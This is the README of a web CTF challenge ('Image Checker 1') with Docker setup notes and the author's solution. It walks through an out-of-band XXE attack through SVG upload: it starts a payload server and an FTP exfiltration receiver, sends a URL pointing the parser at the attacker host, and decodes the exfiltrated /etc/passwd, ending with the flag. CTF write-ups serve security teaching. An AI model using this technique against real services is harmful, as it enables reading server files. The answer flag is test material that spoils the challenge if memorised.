# XXE OOB via SVG rasterization

## Version

Date        | Author                  | Contact               | Version | Comment
---         | ---                     | ---                   | ---     | ---
03/11/2019  | noraj (Alexandre ZANNI) | noraj#0833 on discord | 1.0     | Document creation

Information displayed for CTF players:

+ **Name of the challenge** / **Nom du challenge**: `Image Checker 1`
+ **Category** / **Catégorie**: `Web`
+ **Internet**: not needed
+ **Difficulty** / **Difficulté**: hard / difficile

### Description

```
This image checker is so handy but I fear the worst.

Flag format: sigsegv{flag}

author: [noraj](https://pwn.by/noraj/)
```

### Hints

- Hint1: SVG
- Hint2: XXE

## Integration

This challenge require a Docker Engine and Docker Compose.

Builds, (re)creates, starts, and attaches to containers for a service:

```
$ docker-compose up --build webserver3
```

Add `-d` if you want to detach the container.

## Solving

### Author solution

I was inspired by [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube) WU.

1. The app ask for a SVG.
2. Other file types seem to be refused.
3. Let's pick a legit svg and sent it to see what happens. Alternatively just load `view.php` without parameter.
4. The app seems to parse info from the file.
5. Since SVG is a XML let's try a XXE attack.
6. We can't see any errors, let's try a XXE OOB.
7. Let's start a HTTP server to deliver payloads (`xxe.svg` & `xxe.xml`): `python -m http.server --bind 192.168.1.84 8080`.
8. Let's start a FTP OOB extraction receiver ([230-OOB](https://github.com/lc/230-OOB)): `python 230.py 2121`.
9. Send the payload: http://x.x.x.x:42421/view.php?svg=http://192.168.1.84:8080/xxe.svg.
10. Try to read some files on the FS, the flag is on the last line of `/etc/passwd`.
    ```
    $ printf %s 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9ub2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW4KbHA6eDo0Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3NiaW4vbm9sb2dpbgpzeW5jOng6NTowOnN5bmM6L3NiaW46L2Jpbi9zeW5jCnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duCmhhbHQ6eDo3OjA6aGFsdDovc2Jpbjovc2Jpbi9oYWx0Cm1haWw6eDo4OjEyOm1haWw6L3Zhci9zcG9vbC9tYWlsOi9zYmluL25vbG9naW4KbmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW4KdXVjcDp4OjEwOjE0OnV1Y3A6L3Zhci9zcG9vbC91dWNwcHVibGljOi9zYmluL25vbG9naW4Kb3BlcmF0b3I6eDoxMTowOm9wZXJhdG9yOi9yb290Oi9zYmluL25vbG9naW4KbWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW4KcG9zdG1hc3Rlcjp4OjE0OjEyOnBvc3RtYXN0ZXI6L3Zhci9zcG9vbC9tYWlsOi9zYmluL25vbG9naW4KY3Jvbjp4OjE2OjE2OmNyb246L3Zhci9zcG9vbC9jcm9uOi9zYmluL25vbG9naW4KZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luCnNzaGQ6eDoyMjoyMjpzc2hkOi9kZXYvbnVsbDovc2Jpbi9ub2xvZ2luCmF0Ong6MjU6MjU6YXQ6L3Zhci9zcG9vbC9jcm9uL2F0am9iczovc2Jpbi9ub2xvZ2luCnN
    xdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luCnhmczp4OjMzOjMzOlggRm9udCBTZXJ2ZXI6L2V0Yy9YMTEvZnM6L3NiaW4vbm9sb2dpbgpnYW1lczp4OjM1OjM1OmdhbWVzOi91c3IvZ2FtZXM6L3NiaW4vbm9sb2dpbgpwb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2gKY3lydXM6eDo4NToxMjo6L3Vzci9jeXJ1czovc2Jpbi9ub2xvZ2luCnZwb3BtYWlsOng6ODk6ODk6Oi92YXIvdnBvcG1haWw6L3NiaW4vbm9sb2dpbgpudHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW4Kc21tc3A6eDoyMDk6MjA5OnNtbXNwOi92YXIvc3Bvb2wvbXF1ZXVlOi9zYmluL25vbG9naW4KZ3Vlc3Q6eDo0MDU6MTAwOmd1ZXN0Oi9kZXYvbnVsbDovc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDo4Mjo4MjpMaW51eCBVc2VyLCwsOi9ob21lL3d3dy1kYXRhOi9zYmluL25vbG9naW4KZmxhZzp4Ojk5OTk6OTk5OTpzaWdzZWd2e1MwX3lvdV80cmVfNF9YWEVfbTRzdDNyX3QwMH06L2hvbWUvZmxhZzovc2Jpbi9ub2xvZ2luCm5vcmFqOng6MTMzNzoxMzM3OkxpbnV4IFVzZXIsLCw6L2hvbWUvbm9yYWo6L2Jpbi90cnVlCg==' | base64 -d | tail -2 | head -1 | cut -d ':' -f 5
    ```

Legit SVG example: https://upload.wikimedia.org/wikipedia/commons/6/6a/Godot_icon.svg

## Flag

`sigsegv{S0_you_4re_4_XXE_m4st3r_t00}`
